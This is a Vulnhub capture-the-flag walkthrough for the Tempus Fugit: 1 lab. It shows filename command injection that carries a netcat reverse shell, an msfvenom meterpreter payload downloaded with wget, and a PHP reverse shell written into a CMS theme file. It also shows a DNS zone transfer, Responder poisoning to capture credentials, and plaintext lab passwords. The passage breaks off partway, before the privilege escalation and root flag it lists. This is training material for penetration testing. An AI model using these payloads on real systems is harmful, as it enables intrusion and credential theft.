# Tempus Fugit: 1: Vulnhub Walkthrough

In this article, we are going to crack the Tempus Fugit: 1 Capture the Flag Challenge and present a detailed walkthrough. The machine depicted in this Walkthrough is hosted on Vulnhub. Credit for making this machine goes to 4nqr34z and DCAU. Download this lab by clicking here.

**Penetration Testing Methodology**

**Network Scanning**- Netdiscover Scan
- Nmap Scan

**Enumeration**- Browsing HTTP Service in Browser
- User Enumeration using Command Injection
- Getting netcat session using Command Injection
- Enumerating Cgroup for Dockers
- Enumerating FTP service for CMS Credentials
- Installing Nmap On Target Machine
- Nmap Scan

**Exploitation**- Crafting Payload using MSFvenom
- Transferring Payload to Target Machine
- Getting Meterpreter Session

**Post Exploitation**- Port Forwarding using portfwd
- Enumeration of /etc/hosts on Target Machine
- Installing Bind Tools
- Enumerating using DiG
- Adding CMS URL in attacker’s /etc/hosts
- Accessing the CMS
- Exploiting CMS using a Theme template
- Getting Session for www-data
- Getting Credentials using Responder
- Enumerating the mails of the user
- Getting credentials of another user

**Privilege Escalation**- Enumerating for Sudoers List
- Escalating Privilege using nice

**Reading Root Flag**

**Walkthrough**

**Network Scanning **

We downloaded, imported and ran the virtual machine (.ova) on the VMWare Workstation, the machine will automatically be assigned an IP address from the network DHCP. To begin we will find the IP address of our target machine, for that use the following command as it helps to see all the IP’s in an internal network:

netdiscover


Currently scanning: 172.18.130.0/16 | Screen View: Unique Hosts

4 Captured ARP Req/Rep packets, from 3 hosts. Total size: 240

---------------------------------------------------------------------------------
IP              At MAC Address      Count       Len     MAC Vendor / Hostname
---------------------------------------------------------------------------------
192.168.43.100  00:0c:29:92:bd:91       1        60     VMWare, Inc.


We found the target’s IP Address 192.168.43.100. The next step is to scan the target machine by using the Nmap tool. This is to find the open ports and services on the target machine and will help us to proceed further

nmap -A 192.168.43.100


root@kali:~# nmap -A 192.168.43.100
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-04 02:45 EST
Nmap scan report for nancy (192.168.43.100)
Host is up (0.00054s latency).
Not shown: 999 closed ports
PORT    STATE SERVICE VERSION
80/tcp  open  http    nginx 1.15.3
|_http-server-header: nginx/1.15.3
|_http-title: Tempus Fugit
|_http-trace-info: Problem with XML parsing of /evox/about
MAC Address: 00:0C:29:92:BD:91 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

TRACEROUTE
HOP  RTT      ADDRESS
1    0.54 ms  nancy (192.168.43.100)

OS and Service detection performed. Please report any incorrect results
Nmap done: 1 IP address (1 host up) scanned in 8.15 seconds


**Enumeration **

Here, we performed an Aggressive scan to gather maximum information in a single step. The scan revealed that we only have the TCP port 80 opened. It was running the Nginx server which is hosting the HTTP service. As for the lack of better option let’s get on to enumerate the port 80.

http://192.168.43.100


TEMPUS FUGIT

By 4ndr34z and DCAU


We have a very nice site, which looked like it is made of some popular CMS but, all my hard work exploring the webpage didn’t yield any benefit. But we did find this message.


# TEMPUS FUGIT

**ABOUT**

Tempus Fugit is a Latin phrase, usually translated into English as "time flies". When writing scripts, that is usually very true... This site is for you to upload your scripts for safe keeping on our internal FTP-server.

---

**CONTACT US**


It was in the About section, it tells us the meaning of the word Tempus Fugit which really translates to “Time Flies”. The message also informs that this webpage was designed to upload some scripts onto an internal FTP server. Now all we need to find that upload option. It was on the menu of the webpage. After enumerating for a while, it was clear that this upload option was white-listed. Only .txt and .rtf extensions were allowed. After an exhaustive list of ways to upload any kind of shell but we were unsuccessful. Now it hit us that we could try command injection through this upload option. We tried the very basic injection with “;whoami”. For this we intercepted the request on the “Upload!” and added the injection text in the filename field as shown in the image given below. After this, we forwarded the request to the Target Machine Server.


# TEMPUS FUGIT

## Upload script

**Browse...**  
**test.txt**  
**Upload !**

---

### Burp Suite Community Edition v2.1.07 - Temporary Project

POST /upload HTTP/1.1
Host: 192.168.43.100  
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
Accept-Language: en-US,en;q=0.5  
Accept-Encoding: gzip, deflate  
Referer: http://192.168.43.100/upload  
Content-Type: multipart/form-data;  
boundary=---------------------------1172927621972996232255657164  
Content-Length: 335  
Connection: close  
Upgrade-Insecure-Requests: 1  

---

### Content-Disposition
form-data; name="file"; filename="test.txt;whoami"  
Content-Type: text/plain


http://192.168.43.100/upload test.txt;whoami

It’s good news! The injection was successful. We get a reply “root”. Now the next logical step is to enumerate around the application.


192.168.43.100/upload

TEMPUS FUGIT

Upload s

Browse...    No file selected.

- root
- File successfully uploaded


For enumeration, we thought that Directory Listing is a good way. So, we replaced “;whoami” injection to “;ls”. After performing the ls command injection, we see that we have all the files in the directory listed. This was a pretty consolidated format. But we clearly saw that there was a file named main.py. This must be important.

test.txt;ls


# TEMPUS FUGIT

**Upload script**

**Browse...**  
No file selected.  
**Upload !**

---

- total 44 drwxr-xr-x 1 root root 4096 Feb 4 07:44 . drwxr-xr-x 1 root root 4096 Aug 16 09:45 .. drwxr-xr-x 1 root root 4096 Aug 12 10:20 __pycache__ -rw-r--r-- 1 root root 2226 Aug 12 10:20 main.py  rw-r--r-- 1 root root 204 May 17 2019 prestart.sh drwxr-xr-x 6 14534190 dialout 4096 Aug 9 12:27 static -rw-r--r-- 1 root root 2 Feb 4 07:44 supervisorid.pid drwxr-xr-x 1 14534190 dialout 4096 Aug 12 17:48 templates drwxr-xr-x 1 root root 4096 Feb 4 09:00 upload -rw-r--r-- 1 root root 37 May 17 2019 uwsgi.ini

- File successfully uploaded


We tried to read the main.py file using the cat command. We get an error “Only RTF and TXT files are allowed”. We deduced from this is that the filter is not allowing “.py” in the injection as well. So, to work around this filter, we thought to try the wildcard option (*).

test.txt;cat main*


It worked! We were able to read the main.py file. It was the internal FTP server that is working on the backend. On taking a closer look we see that we have a username and a hash which looks like MD5.

someuser
b232a4da4c104798be4613ab76d26efda1a04606


import os import urllib.request from flask import Flask, flash, request, redirect, render_template from ftplib import FTP import subprocess UPLOAD_FOLDER = 'uploaded'
ALLOWED_EXTENSIONS = {'txt', 'rtf'} app = Flask(__name__) app.secret_key = "mofosecret" app.config['MAX_CONTENT_LENGTH'] = 2 * 1024 * 1024 @app.route('/', defaults={'path': '}) @app.route('/<path:path>') def catch_all(path): cmd = 'fortune -o' result = subprocess.check_output(cmd, shell=True) return "<h1>400 - Sorry. I didn't find what you where looking for.</h1>" <h2>Maybe this will cheer you up:</h2> <h3>"+result.decode("utf-8")+"</h3>" @app.errorhandler(500) def internal_error(error): return "<h1>500?! - What are you trying to do here?!</h1>" @app.route('/') def home(): return render_template('index.html') @app.route('/upload') def upload_form(): try: return render_template('my-form.html') except Exception as e: return render_template("500.html", error = str(e)) def allowed_file(filename): check = filename.rsplit('/', 1)[1].lower() check = check[:3] in ALLOWED_EXTENSIONS return check @app.route('/upload', methods=['POST']) def upload_file(): if request.method == 'POST': file' not in request.files: flash('No file part') return redirect(request.url) file = request.files['file'] if file.filename == '': flash('No file selected for uploading') return redirect(request.url) if file.filename and allowed_file(file.filename): filename = file.filename file.save(os.path.join(UPLOAD_FOLDER, filename)) cmd="cat "+UPLOAD_FOLDER+"/"+filename result = subprocess.check_output(cmd, shell=True) flash(result.decode("utf-8")) flash('File successfully uploaded') try: ftp = FTP('ftp.mofo.pwn') ftp.login('someuser', 'b232a4da4c104798be4613ab76d26efda1a04606') with open(UPLOAD_FOLDER+"/"+filename, 'rb') as f: ftp.storlir(ftp.quit() except: flash("Cannot connect to FTP-server") return redirect('/upload') else: flash('Allowed file types are txt and rtf') return redirect(request.url) if __name__ == '__main__': app.run()


Now, we cannot proceed further without a proper shell to work. But as we figured out earlier that the dot (.) is also blacklisted. We went on to the internet to find the representation of IP Address without the dot. We came across Long IP. So, we thought of trying to gain the session using the Long IP format of our attacker IP. The conversion to Long IP was not difficult, there were many converters available online.

Now using the command injection, we found earlier, we entered a netcat invocation shell command. This command invoked a shell on port 6666 on our attacker machine.

test.txt;nc 3232246747 6666 -e sh


**Burp Suite Community Edition v2.1.07 - Temporary Project**

POST /upload HTTP/1.1
Host: 192.168.43.100  
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
Accept-Language: en-US,en;q=0.5  
Accept-Encoding: gzip, deflate  
Referer: http://192.168.43.100/upload  
Content-Type: multipart/form-data;  
boundary=---------------------------2122595576369697694224618358  
Content-Length: 335
Connection: close  
Upgrade-Insecure-Requests: 1  

---

### Content
**Content-Disposition:** form-data; name="file"; filename="test.txt"; nc 3232246747 6666 -e sh"  
**Content-Type:** text/plain


We started a Listener before executing the command to invoke a shell. After execution, we get the shell. But to convert the improper shell into TTY shell, we used the python one-liner. Now that we have the TTY shell, we ran the whoami command which told us that we are the root user.

nc -lvp 6666
python -c 'import pty; pty.spawn("/bin/sh")'
whoami
bash


root@kali:~# nc -lvp 6666
listening on [any] 6666 ...
connect to [192.168.43.219] from nancy [192.168.43.100] 36511
python -c 'import pty; pty.spawn("/bin/sh")'
/app # ^[[13;8Rwhoami
whoami
root
/app # ^[[16;8R


Now we knew that this was not that easy. So, we went straight up to the root directory. Here we see that we have a text file named message.txt. We read the contents of the message. As expected, it tells us that we are not done yet.

cd /root
ls
cat message.txt


bash-4.4# cd /root
cd /root
bash-4.4# ls
ls
message.txt
bash-4.4# cat message.txt
cat message.txt
No, you are not done yet ;-)
bash-4.4#


Now we started to enumerate the other directories that are available for us in search of some hint to move forward. We used the ls command in the root directory which revealed a folder named .ncftp. We decided to take a look at it. Inside it, we found some files, in which trace.234 file revealed some information that was worth looking into. We saw that there was an IP Address that didn’t seem to be part of our subnet. There were attempts to connect to that particular IP Address.

ls -la
cd .ncftp
ls -la
cat trace.234


bash-4.4# ls -la
ls -la
total 32
drwx------   1 root    root    4096 Aug 16 06:32 .
drwxr-xr-x   1 root    root    4096 Aug 16 09:45 ..
lrwxrwxrwx   1 root    root       9 Aug 11 21:17 .ash_history -> /dev/n
lrwxrwxrwx   1 root    root       9 Aug 11 21:18 .bash_history -> /dev/n
drwx------   1 root    root    4096 May 17  2019 .cache
drwxr-xr-x   3 root    root    4096 Aug 11 05:34 .config
drwxr-xr-x   1 root    root    4096 Aug 11 05:34 .local
drwxr-xr-x   2 root    root    4096 Aug 11 05:37 .ncfpt
-rw------    1 root    root     309 Aug  8 11:10 .python_history
-rw-r--r--   1 root    root      29 Aug 16 06:32 message.txt
bash-4.4# cd .ncfpt
cd .ncfpt
bash-4.4# ls -la
ls -la
total 24
drwxr-xr-x   2 root    root    4096 Aug 11 05:37 .
drwx------   1 root    root    4096 Aug 16 06:32 ..
-rw-------   1 root    root    4123 Aug 11 05:37 firewall
-rw-r--r--   1 root    root     142 Aug 11 05:37 init_v3
-rw-------   1 root    root    2733 Aug 11 05:42 trace.234
bash-4.4# cat trace.234
cat trace.234
SESSION STARTED at: 2019-08-11 05:37:10 UTC +0000
Program Version:    NcFTP 3.2.6/575 Dec 04 2016, 01:00 PM compiled for linux-x86_64-libc5
Compiled for:       linux-x86_64-libc5
Process ID:         234
Hostname:             (rc=-2)
Terminal:           xterm
05:37:10 Fw: Type: 0 User: Pass: (none) Port: 0
05:37:10 FwExceptions:
05:37:10 NOTE: Your domain name could not be detected.
05:37:10 Resolving 172.19.0.12 ...
05:37:10 Connecting to 172.19.0.12 ...
05:37:10 LibNcFTP 3.2.6 (November 12, 2016) compiled for linux-x86_64-libc5
05:37:10 Uname: Linux|www|4.9.184-linuxkit|#1 SMP Tue Jul 2 22:58:16 UTC 2019
05:37:10 Contents of /etc/issue:
05:37:10    Welcome to Alpine Linux 3.7
05:37:10    Kernel r on an \m (\l)
05:37:10 Could not connect to 172.19.0.12 -- try again later: Operation timed out
05:37:10 Retry Number: 1
05:37:30 Redialing (try 1) ...
05:37:51 Could not connect to 172.19.0.12 -- try again later: Operation timed out
05:37:51 Retry Number: 2
05:37:51 Redialing (try 2) ...
05:38:12 Could not connect to 172.19.0.12 -- try again later: Operation timed out
05:38:12 Retry Number: 3
05:38:12 Redialing (try 3) ...
05:38:33 Could not connect to 172.19.0.12 -- try again later: Operation timed out
05:38:33 Retry Number: 4
05:38:33 Redialing (try 4) ...


At this moment it hit us that, as we are root and there are multiple IP Addresses involved. It is possible that we are in a docker environment. So, to confirm that we tried to read the proc cgroup file. As expected, we are indeed in a docker environment. As we know that we can run the netcat in this environment, and we found a new IP Address inside an NcFTP directory. We had a hunch that the IP Address we found must be running an NcFTP service. To confirm, we ran a port scan using the netcat on the IP Address we found as shown in the image given below.

cat /proc/1/cgroup nc -zv 172.19.0.12 21


bash-4.4# cat /proc/1/cgroup
cat /proc/1/cgroup
11:cpuset:/docker/9b4f184929a14552707b0d8202d9278feef014ebcdfe70ccdfc0beaaaacd24ed4
10:memory:/docker/9b4f184929a14552707b0d8202d9278feef014ebcdfe70ccdfc0beaaaaacd24ed4
9:devices:/docker/9b4f184929a14552707b0d8202d9278feef014ebcdfe70ccdfc0beaaacd24ed4
8:rda:/dev
7:net_cls,net_prio:/docker/9b4f184929a14552707b0d8202d9278feef014ebcdfe70ccdfc0beaaeacd24ed4
6:pid:/docker/9b4f184929a14552707b0d8202d9278feef014ebcdfe70ccdfc0beaeaaacd24ed4
5:blkio:/docker/9b4f184929a14552707b0d8202d9278feef014ebcdfe70ccdfc0beaeaacd24ed4
4:freezer:/docker/9b4f184929a14552707b0d8202d9278feef014ebcdfe70ccdfc0beaaaaaaaaacd24ed4
3:cpu,cpuaacct:/docker/9b4f184929a14552707b0d8202d9278feef014ebcdfe70ccdfc0beeaacd24ed4
2:perf_event:/docker/9b4f184929a14552707b0d8202d9278feef014ebcdfe70ccdfc0beeeaaaaacd24ed4
1:name=systemd:/docker/9b4f184929a14552707b0d8202d9278feef014ebcdfe70ccdfc0beeeeaaaaacd24ed4
0::/system.slice/docker.service
bash-4.4# nc -zv 172.19.0.12 21
nc -zv 172.19.0.12 21
172.19.0.12 (172.19.0.12:21) open


Our port scan reveals that the IP Address we found is running an FTP service on port 21. We used the lftp command to login into the FTP service. We used the credentials that we found in the main.py earlier. Now, we found a hash in the main.py. We decoded it and it came out to be “mofo”. We tried that as a password. But it wasn’t a success. So, we tried the hash as a password. That worked and we were inside the FTP Server. Now in the FTP server, we found a cmscreds.txt file. In this file, we have a set of credentials that would help us logging into a CMS but the location of CMS still remains a mystery.

lftp someuser@172.19.0.12
b232a4da4c104798be4613ab76d26efda1a04606
ls
cat cmscreds.txt
Admin
hardEnough4u


bash-4.4# lftp someuser@172.19.0.12
lftp someuser@172.19.0.12
Password: b232a4da4c104798be4613ab76d26efda1a04606

lftp someuser@172.19.0.12: -> ls
ls
-rw-------    1 ftp    ftp      52 Aug 12 17:07    cmscreds.txt
-rw-------    1 ftp    ftp    5683 Feb 04 08:50    shell.txt
-rw-------    1 ftp    ftp    5683 Feb 04 08:53    shell.txt;whoami
-rw-------    1 ftp    ftp       0 Feb 04 09:13    test.txt;cat main*
-rw-------    1 ftp    ftp       0 Feb 04 09:00    test.txt;ls -la
-rw-------    1 ftp    ftp       0 Feb 04 10:14    test.txt;nc 3232246747 666
-rw-------    1 ftp    ftp       0 Feb 04 08:58    test.txt;whoami
-rw-------    1 ftp    ftp      42 Aug 15 14:01    user.txt;nc 3232252550 443
lftp someuser@172.19.0.12: / > cat cmscreds.txt
cat cmscreds.txt
Admin-password for our new CMS
hardEnough4u

52 bytes transferred


We went back to the root directory where we found the .ncftp directory. Here we found a file named .python_history. Anything that is hidden, and is named history is worth looking into. So, we dig in to find a set of credentials. But wait there is more. We have an IP Address that is mentioned inside the code. We see that this seems to be out on a different subnet. But definitely requires investigation.

ls -la cat .python_history someuser myD3#2p$a%s&s


bash-4.4# ls -la
ls -la
total 40
drwx------   1 root    root    4096 Aug 16 06:32 .
drwxr-xr-x   1 root    root    4096 Aug 16 09:45 ..
lrwxrwxrwx   1 root    root       9 Aug 11 21:17 .ash_history -> /home/ash/.bash_history
lrwxrwxrwx   1 root    root       9 Aug 11 21:18 .bash_history -> /home/ash/.bash_history
drwx------   1 root    root    4096 May 17  2019 .cache
drwxr-xr-x   3 root    root    4096 Aug 11 05:34 .config
drwxr-xr-x   1 root    root    4096 Aug 11 05:34 .local
drwxr-xr-x   2 root    root    4096 Aug 11 05:37 .ncftp
-rw-------   1 root    root     309 Aug  8 11:10 .python_history
-rw-r--r--   1 root    root      29 Aug 16 06:32 message.txt

bash-4.4# cat .python_history
cat .python_history
import os
os.system(ls)
os.system(ls);
os.system('ls');
import libftp
import ftplib
FTP.
from ftplib import FTP
ftp = FTP('10.10.8.3')
                        ftp.login('someuser', 'myD3#2p$a%s&s')
ftp = FTP('10.10.8.3')
ftp = FTP('127.0.0.1');
ftp = FTP('speedtest.tele2.net');
ftp = FTP('127.0.0.1');
ftp = FTP('10.10.8.3');
q
bash-4.4#


Now, although we have the standard netcat method to scan for active ports, we need something more powerful. Nmap. I checked if we have Nmap installed on this machine. But it wasn’t. Then it hit us, that we are root. So, if there is something that is not installed, we can install it. I tried apt install Nmap but that gave back an error. So, I investigated on the flavour of the Linux that we have here. Then while we were reviewing our steps, there we saw that when we read the file named trace.234. It tells us that our Target is running Alpine Linux 3.7. That’s quite helpful. This means that we will have to run the apk add command to get Nmap installed. Now as we are surrounded by multiple IP Address that is only accessible through the target machine. We went on the mission to find all the IP Address that is in question by scanning the whole subnet for available IP Addresses. This gave us a total of 4 IP Addresses.

apk add nmap nmap
-sn 172.19.0.0/16


bash-4.4# apk add nmap
apk add nmap
fetch http://dl-cdn.alpinelinux.org/alpine/v3.7/main/x86_64/APK1
fetch http://dl-cdn.alpinelinux.org/alpine/v3.7/community/x86_64
(1/2) Installing libpcap (1.8.1-r1)
(2/2) Installing nmap (7.60-r3)
Executing busybox-1.27.2-r11.trigger
OK: 160 MiB in 81 packages
bash-4.4# nmap -sn 172.19.0.0/16
nmap -sn 172.19.0.0/16

Starting Nmap 7.60 ( https://nmap.org ) at 2020-02-04 11:08 UTC
Nmap scan report for 172.19.0.1
Host is up (0.0000040s latency).
MAC Address: 02:42:B7:2F:F5:4B (Unknown)
Nmap scan report for ftp.isolated_nw (172.19.0.12)
Host is up (0.000025s latency).
MAC Address: 02:42:AC:13:00:0C (Unknown)
Nmap scan report for dns.isolated_nw (172.19.0.100)
Host is up (-0.090s latency).
MAC Address: 02:42:AC:13:00:64 (Unknown)
Nmap scan report for sid (172.19.0.10)
Host is up.


We decided to start with the 172.19.0.1 and we saw that it has the port 22, 80 and 8080 open. And we have some sort of Proxy running on the system. Now whenever we come across a proxy, we know we have to use port forwarding to get through. There are multiple ways to do this. But we prefer using Metasploit. For this, we will have to gain a meterpreter session on the system.

nmap 172.19.0.1


bash-4.4# nmap 172.19.0.1
nmap 172.19.0.1

Starting Nmap 7.60 ( https://nmap.org ) at 2020-02-04 11:14 UTC
Nmap scan report for 172.19.0.1
Host is up (0.000019s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
MAC Address: 02:42:B7:2F:F5:4B (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 1.59 seconds
bash-4.4#


**Exploitation **

To gain meterpreter, we first need to craft a payload. We used the msfvenom for this task. As the target machine was running Alpine Linux. We decided to craft the payload in .elf format. After creating the payload, we use the python one line to host the payload on the port 80 in order to transfer the payload from our attacker machine to target machine.

msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.43.219 lport=1234 -f elf > payload.elf
python -m SimpleHTTPServer 80


root@kali:~# msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.43.219 lport=1234 -f elf > payload.elf
[–] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[–] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 123 bytes
Final size of elf file: 207 bytes

root@kali:~# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...


Now, onto the session that we have of the target machine. We used wget to download the payload file to the target machine. Now we need to give proper permissions to the payload so that it can be executed easily.

wget http://192.168.43.219/payload.elf
chmod 777 payload.elf


bash-4.4# wget http://192.168.43.219/payload.elf
wget http://192.168.43.219/payload.elf
Connecting to 192.168.43.219 (192.168.43.219:80)
payload.elf    100% |*************************************| 207   0:00:00 ETA
bash-4.4# chmod 777 payload.elf
chmod 777 payload.elf


**Post Exploitation **

After giving proper permissions, we execute the elf file. After execution, we see that we have the meterpreter session on our attacker machine. Now, we used the portfwd command to forward the 8080 port of the internal IP to our attacker machine i.e., Kali Linux.

portfwd add -l 8080 -p 8080 -r 172.19.0.1


meterpreter > portfwd add -l 8080 -p 8080 -r 172.19.0.1
[*] Local TCP relay created: :8080 ↔ 172.19.0.1:8080
meterpreter >


We tried to access the CMS but we were not successful. This means that some more enumeration is required. We went back to our shell on the target machine and started to look around. As the CMS was not accessible, we thought to take a look at the etc directory for any hosts. Here we found “sid” mapped to the IP Address of CMS. We looked inside the resolve.conf and found “mofo.pwn” written.

ls /etc/ cat /etc/hosts cat /etc/resolv.conf


bash-4.4# ls /etc/
ls /etc/
TZ    logrotate.d    profile
alpine-release    mailcap    profile.d
apk    mime.types    protocols
ca-certificates    mke2fs.conf    resolv.conf
ca-certificates.conf    modprobe.d    security
conf.d    modules    services
crontabs    modules-load.d    shadow
fstab    motd    shadow-
group    mtab    shells
group-    nanorc    ssh
hostname    netconfig    ssl
hosts    network    supervisor.d
init.d    nginx    supervisord
inittab    opt    sysctl.conf
issue    os-release    sysctl.d
krb5.conf    passwd    terminfo
lftp.conf    passwd-    udhcpd.conf
localtime    periodic    uwsgi
bash-4.4# cat /etc/hosts
cat /etc/hosts
127.0.0.1    localhost
::1    localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.19.0.10    sid
bash-4.4# cat /etc/resolv.conf
cat /etc/resolv.conf
search mofo.pwn
nameserver 127.0.0.11
options ndots:0
bash-4.4#


It was quite possible this might be the host that would lead us to the CMS. To confirm our suspicions, we decided to use the bind tools. As they were not installed, we used the apk add command to install those. After that, we ran the dig command and found the host that we were looking for. ourcms.mofo.pwn seems to be the host that would take us to the CMS that we need.

apk add bind-tools
dig axfr mofo.pwn


bash-4.4# apk add bind-tools
apk add bind-tools
fetch http://dl-cdn.alpinelinux.org/alpine/v3.7/main/x86_64/APKINDEX.tar.gz
fetch http://dl-cdn.alpinelinux.org/alpine/v3.7/community/x86_64/APKINDEX.tar.gz
(1/2) Installing bind-libs (9.11.8-r0)
(2/2) Installing bind-tools (9.11.8-r0)
Executing busybox-1.27.2-r11.trigger
OK: 163 MiB in 83 packages
bash-4.4# dig axfr mofo.pwn
dig axfr mofo.pwn

; <>> DiG 9.11.8 <<>> axfr mofo.pwn
;; global options: +cmd
mofo.pwn.         14400    IN    SOA      ns1.mofo.pwn. admin.mofo.pwn. 14
mofo.pwn.         14400    IN    TXT      "v=spf1 ip4:176.23.46.22 a mx ~al"
mofo.pwn.         14400    IN    NS       ns1.mofo.pwn.
ftp.mofo.pwn.     14400    IN    CNAME    punk.mofo.pwn.
gary.mofo.pwn.    14400    IN    A        172.19.0.15
geek.mofo.pwn.    14400    IN    A        172.19.0.14
kfc.mofo.pwn.     14400    IN    A        172.19.0.17
leet.mofo.pwn.    14400    IN    A        172.19.0.13
mail.mofo.pwn.    14400    IN    TXT      "v=spf1 a -all"
mail.mofo.pwn.    14400    IN    A        172.19.0.11
milo.mofo.pwn.    14400    IN    A        172.19.0.16
nancy.mofo.pwn.   14400    IN    A        172.19.0.1
ns1.mofo.pwn.     14400    IN    A        172.19.0.100
ourcms.mofo.pwn.  14400    IN    CNAME    nancy.mofo.pwn.
punk.mofo.pwn.    14400    IN    A        172.19.0.12
sid.mofo.pwn.     14400    IN    A        172.19.0.10
www.mofo.pwn.     14400    IN    CNAME    sid.mofo.pwn.
mofo.pwn.         14400    IN    SOA      ns1.mofo.pwn. admin.mofo.pwn. 14
;; Query time: 1 msec
;; SERVER: 127.0.0.11#53(127.0.0.11)
;; WHEN: Wed Feb 05 05:45:57 UTC 2020
;; XFR size: 18 records (messages 1, bytes 466)


Since the Tempus Fugit original webpage is still running on the target IP Address, we need to kill that process in order to access this CMS. We ran the netstat command and found that Nginx running with the PID 9. So, we killed it.

netstat -ntlp
kill 9


bash-4.4# netstat -ntlp
netstat -ntlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address         Foreign Address     State       PID/Program name
tcp        0      0 127.0.0.11:42533      0.0.0.0:*           LISTEN      -
tcp        0      0 0.0.0.0:80            0.0.0.0:*           LISTEN      9/nginx
bash-4.4# kill 9
kill 9


Now to access the CMS, we need to add that host we found in our i.e., Kali’s /etc/hosts file.

cat /etc/hosts


root@kali:~# cat /etc/hosts
127.0.0.1 ourcms.mofo.pwn
127.0.0.1    localhost
127.0.1.1    kali

# The following lines are desirable for IPv6 capable hosts
::1    localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
root@kali:~#


Now, all that left is to access the CMS from our browser. As we forwarded the port. We will access the webpage on 8080.


Welcome to ourCMS!

Last week on Aug 7. we launched the new Intranet. The Intranet is a portal-like website that contains information meant for our members, which is why it requires a username and password to access most Intranet content.

The homepage contains a collection of links relevant to the person logged in, and it’s the place to post announcements and events.

Our main goal with the new Intranet was to provide similar, but better, communication tools in a user-friendly way. We did a lot of user testing and interviews, which made the direction of our work very clear. Hopefully the new Intranet addresses most of the downfalls of the old Intranet. If you feel like it doesn’t or you have suggestions, we would appreciate it if you would send us your feedback.

Published on August 13th, 2019


Finding the admin login panel was quite easy and if we remember correctly, we have the credentials for this CMS.

http://ourcms.mofo.pwn:8080
http://ourcms.mofo.pwn:8080/admin/
Admin
hardEnough4u


ourcms.mofo.pwn:8080/admin/

ourCMS

Username:
Admin

Password:
**********

Login

« Back to Website | Forgot your password? »


After logging in the CMS, we went to the Themes Section. Themes are mostly designed in PHP format and those are easier to edit and gain a shell. We edited the Innovation Theme’s template file.

http://ourcms.mofo.pwn:8080/admin/theme-edit.php


# ourCMS

## Theme Editor

**Editing File:** http://ourcms.mofo.pwn:8080/theme/Innovation/template.php

<?php if(!defined('IN_GS')) { die('you cannot load this page directly.'); }
/*************************************************************
*
* @File:    template.php
* @Package: GetSimple
* @Action:  Innovation theme for GetSimple CMS
*
**************************************************************/

# Get this theme's settings based on what was entered within its plugin.
# This function is in functions.php
$innov_settings = Innovation_Settings();

# Include the header template
include('header.inc.php');
?>

<div class="wrapper_clearfix">
    <!-- page content -->
    <article>
        <section>


We replaced the contents of the template.php file with the PHP reverse shell payload and edited the IP Address and the port as shown in the image given below.


// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
// This tool may be used for legal purposes only. Users take full responsibility
// for any actions performed using this tool. If these terms are not acceptable to
// you, then do not use this tool.
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
// Description
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
// Limitations
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under
// Some compile-time options are needed for daemonisation (like pctl, posix). These are rarely avail
// Usage
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
set_time_limit (0);
$VERISON = "1.0";
$ip = '192.168.43.219'; // CHANGE THIS
$port = 8888; // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;


Now before saving and accessing the template from the URL provided. We ran a netcat listener to receive the session that would be generated by the reverse shell payload upon execution. The shell popped up. We ran the whoami command and found that we are www-data user. Now we need to escalate privilege from here.

nc -lvp 8888
whoami


root@kali:~# nc -lvp 8888
listening on [any] 8888 ...
connect to [192.168.43.219] from nancy [192.168.43.100] 56904
Linux nancy 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u2 (2019-08-11 11:30:39 up 29 min,  0 users,  load average: 0.00, 0.00, 0.00)
USER    TTY    FROM    LOGIN@    IDLE    JCPU    PCUP   WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$


Here we were stuck for a bit, there was almost no hint possible and we were left with enumeration. Here we contacted the author and got the hint that Wireshark would be helpful. If Wireshark is helpful it means that there must be some queries in the network. We ran the Wireshark to find some DNS queries in the network but to get some credentials we need the responder tool. We ran the responder and let it work for a while in the network. After a while, we got some credentials. It was for the user roxi.

responder -I eth0


[+] Listening for events ...
[*] [MDNS] Poisoned answer sent to 192.168.43.100 for name geek.local
[HTTP] Basic Client   : 192.168.43.100
[HTTP] Basic Username : roxi
[HTTP] Basic Password : scooby


We used the su command to login as roxi.

su roxi
scooby
python -c 'import pty; pty.spawn("/bin/sh")'


$ su roxi
Password: scooby
python -c 'import pty; pty.spawn("/bin/sh")'
$ whoami
whoami
roxi


We started our enumeration for this user roxi. We see that this user has some mails.

ls /var/
cd /var/mail
ls
cat roxi


$ ls /var/
ls /var/
backups  cache  lib  local  lock  log mail  opt  run  spool  tmp  www
$ cd /var/mail/
cd /var/mail/
$ ls
ls
roxi
$ cat roxi


Let’s dig into that. There was some elaborate story in those emails but in the end, these mails have some credentials. It was for the user dorelia.


You will need my username and password when you step in for me next week
